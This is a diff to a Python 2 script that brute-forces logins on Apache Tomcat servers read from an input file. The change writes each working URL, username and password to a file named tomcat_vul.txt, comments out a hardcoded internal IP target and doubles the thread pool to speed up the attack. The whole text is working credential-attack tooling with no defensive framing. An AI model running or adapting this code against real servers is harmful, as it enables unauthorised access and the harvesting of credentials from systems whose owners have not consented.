@@ -25,13 +25,16 @@ def brute_force(ip_port):
             if response.status_code == 200:
                 s = re.findall(r".*Tomcat.*", response.content)
                 if s:
+                    f = open('tomcat_vul.txt','a')
+                    f.write(url + ':' + uname + ':' + pwd + '\n')
+                    f.close()
                     print url, 'have vul', uname, pwd
 
 
 if __name__ == '__main__':
 
     urls = []
-    urls.append(['10.223.2.60','9090'])
+    # urls.append(['10.223.2.60','9090'])
 
     for line in open(sys.argv[1]):
         line = line.strip('\n')
@@ -40,7 +43,7 @@ if __name__ == '__main__':
             urls.append([ip, line.split(',')[1]])
 
     #print urls
-    pool = Pool(10)
+    pool = Pool(20)
     pool.map(brute_force, urls)
     pool.close()
     pool.join()
